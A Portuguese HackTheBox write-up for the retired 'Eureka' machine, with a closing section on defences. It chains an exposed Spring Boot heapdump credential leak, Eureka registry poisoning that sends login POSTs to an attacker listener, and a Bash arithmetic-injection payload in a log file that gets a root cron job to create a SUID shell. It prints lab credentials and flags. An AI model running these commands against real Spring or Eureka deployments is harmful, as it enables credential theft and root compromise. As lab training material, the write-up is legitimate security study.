HackTheBox — Eureka

HackTheBox · retired DIFÍCIL Spring Boot ActuatorheapdumpEureka registry poisoningMITMbash arithmetic injection

resumo

Máquina Linux (Ubuntu 20.04) rodando um ecossistema de microsserviços Spring Boot: um site "Furni", um Spring Cloud Gateway e um Eureka Server (descoberta de serviços da Netflix) na porta 8761. A cadeia vai de um /actuator/heapdump exposto até root, passando por um ataque MITM via envenenamento do registro de serviços — o ponto mais interessante da box.

Actuator heapdump exposto (sem auth)
        │  credenciais em texto claro na memória da JVM
        ▼
SSH oscar190 (foothold)  ──►  config do gateway: rotas por nome lógico (lb://)
        │
        ▼
Envenenamento do registro Eureka  ──►  MITM no /login  ──►  creds de miranda-wise
        │
        ▼
SSH miranda-wise (grupo developers)  ──►  user.txt
        │
        ▼
Injeção em contexto aritmético Bash (cron root)  ──►  bash SUID  ──►  root.txt

fase 1 — reconhecimento

nmap -Pn -p- --min-rate 1000 -T4 10.129.96.11
nmap -Pn -sV -sC -p 22,80,8761 10.129.96.11

Três portas: 22 (SSH), 80 (nginx, redireciona para furni.htb) e 8761 (Tomcat com HTTP Basic — o Eureka Server, que dá nome à box). Adicionei furni.htb ao /etc/hosts. O site é um e-commerce Spring Boot; os headers (Vary: Origin, X-Frame-Options: DENY) confirmam Spring Security no backend.

fase 2 — Actuator heapdump → vazamento de credenciais

Enumerando endpoints do Spring Boot Actuator, todos respondiam 200 sem autenticação — sintoma clássico de management.endpoints.web.exposure.include=*.

for ep in actuator actuator/health actuator/env actuator/heapdump actuator/beans; do
  curl -s -o /dev/null -w "$ep -> %{http_code}\n" "http://furni.htb/$ep"
done
# actuator/heapdump -> 200

Mecanismo: o endpoint /actuator/heapdump despeja toda a memória da JVM (~76 MB) para download. Credenciais que o processo carrega em runtime — string de conexão JDBC, usuário/senha do banco, e as credenciais Basic do Eureka — ficam em texto claro nesse dump. Classe: CWE-200 (exposição de informação) por configuração insegura do Actuator.

curl -s -o heapdump "http://furni.htb/actuator/heapdump"
strings heapdump | grep -E 'jdbc:mysql|EurekaSrvr|datasource.username' | sort -u

Saíram duas credenciais sem precisar de ferramenta especializada:

oscar190 : 0sc@r190_S0l!dP@sswd      # app/DB
EurekaSrvr : 0scarPWDisTheB3st        # Basic auth do Eureka (:8761)

fase 3 — foothold SSH e a arquitetura do gateway

sshpass -p '0sc@r190_S0l!dP@sswd' ssh oscar190@10.129.96.11 "id; sudo -l"

Login OK como oscar190 (sem sudo). A user.txt pertence a miranda-wise, não a mim — preciso de um pivô. Inspecionando a config do gateway encontrei o ponto fraco do desenho:

cat /var/www/web/cloud-gateway/target/classes/application.yaml
# routes:
#   - id: user-management-service
#     uri: lb://USER-MANAGEMENT-SERVICE     ← nome lógico, não IP
#     predicates: [ Path=/login,/register ]

Mecanismo: o gateway roteia /login para lb://USER-MANAGEMENT-SERVICE — um nome lógico. O IP real é resolvido consultando o Eureka a cada requisição. Ou seja: quem controla o registro Eureka controla para onde o login vai. Com as credenciais do Eureka vazadas na fase 2, dá para sequestrar esse roteamento.

fase 4 — envenenamento do registro Eureka → MITM → user.txt

A ideia: registrar uma instância falsa apontando para a minha máquina e apagar a real, de forma que o gateway passe a mandar os POSTs de /login para o meu listener.

# 1) registra instância falsa apontando para o meu host (10.10.15.200:8081)
curl -s -X POST "http://EurekaSrvr:0scarPWDisTheB3st@10.129.96.11:8761/eureka/apps/USER-MANAGEMENT-SERVICE" \
  -H 'Content-Type: application/json' -d '{ "instance": { "instanceId":"evil",
  "hostName":"10.10.15.200","ipAddr":"10.10.15.200","app":"USER-MANAGEMENT-SERVICE",
  "vipAddress":"USER-MANAGEMENT-SERVICE","status":"UP","port":{"$":8081,"@enabled":"true"},
  "dataCenterInfo":{"@class":"com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo","name":"MyOwn"} } }'

# 2) apaga a instância real — em loop, porque o heartbeat a recria a cada ~20s
curl -s -X DELETE "http://EurekaSrvr:0scarPWDisTheB3st@10.129.96.11:8761/eureka/apps/USER-MANAGEMENT-SERVICE/localhost:USER-MANAGEMENT-SERVICE:8081"

Mecanismo: o Eureka não valida quem registra uma instância nem para qual host ela aponta. Registrando uma instância falsa e deletando a real em loop (a cada 2–3s, para vencer o heartbeat de ~20s que recria a verdadeira), o gateway resolve o nome lógico para o meu IP. Um cron do root simula logins periodicamente, então os POSTs reais caem no meu nc:

nc -lvnp 8081
# POST /login ... username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve
# URL-decode → miranda.wise@furni.htb : IL!veT0Be&BeT0L0ve
sshpass -p 'IL!veT0Be&BeT0L0ve' ssh miranda-wise@10.129.96.11 "id; cat ~/user.txt"
# groups=...,1003(developers)
# user.txt: 3094ff0df47671a77a8f94bbd8977733

Importante para a próxima fase: miranda-wise pertence ao grupo developers.

fase 5 — recon de privesc: injeção em contexto aritmético Bash

ls -la /opt/
# -rwxrwxr-x 1 root root log_analyse.sh   ← root, mas legível/rodado via cron root

Um script do root, log_analyse.sh, é executado por cron a cada ~1 min e lê /var/www/web/cloud-gateway/log/application.log. A função vulnerável compara códigos HTTP assim:

code=$(echo "$line" | grep -oP 'Status: \K.*')
if [[ "$existing_code" -eq "$code" ]]; then ... fi

Mecanismo (o coração da box): dentro de [[ ... -eq ... ]], o Bash avalia os dois lados em contexto aritmético. Se $code vem direto do log (entrada externa) e contém uma expressão de índice de array como x[$(comando)], o Bash executa o comando durante a avaliação aritmética — como root. É CWE-78 (command injection) num lugar que a maioria não imagina: uma comparação numérica.

Falta controlar o conteúdo do log. O arquivo é www-data, mas o diretório pai é gravável pelo grupo developers — então eu, como miranda-wise, faço backup do log e crio um novo com o mesmo nome, de minha propriedade:

ls -la /var/www/web/cloud-gateway/log/
# drwxrwxr-x www-data developers  ← diretório gravável pelo grupo developers

fase 6 — injeção no cron root → root.txt

Injeto uma linha de log com o payload no formato que a avaliação aritmética executa. Como o próprio gateway reescreve o log continuamente, reinjeto a cada poucos segundos até o cron do root ler na hora certa:

while true; do
  ssh miranda-wise@10.129.96.11 'cd /var/www/web/cloud-gateway/log && \
    mv application.log application.log.bk 2>/dev/null; \
    echo "HTTP Status: x[\$(cp /bin/bash /tmp/rootbash; chmod 6777 /tmp/rootbash)]" > application.log'
  sleep 5
done
# após ~60s: -rwsrwsrwx 1 root root /tmp/rootbash
ssh miranda-wise@10.129.96.11 "/tmp/rootbash -p -c 'id; cat /root/root.txt'"
# euid=0(root)
# root.txt: 3620ed3a81837edb608b71e7ed6f0825

O -p é essencial: sem ele o bash descarta o euid=0 obtido pelo bit SUID e volta para o uid do miranda-wise.

o que quebraria a cadeia (defesa)

  • Actuator: expor só health; nunca heapdump/env publicamente. Restringir a rede de admin + autenticação.
  • Eureka: autenticação forte (mTLS) para registro; ACL de quais host/IP podem ser registrados; segredos fora do código, em cofre.
  • Script de log: validar que $code é numérico ([[ "$x" =~ ^[0-9]+$ ]]) antes de qualquer comparação aritmética — ou comparar como string.
  • Permissões: diretório lido por cron root não deve ser gravável por um grupo amplo como developers.
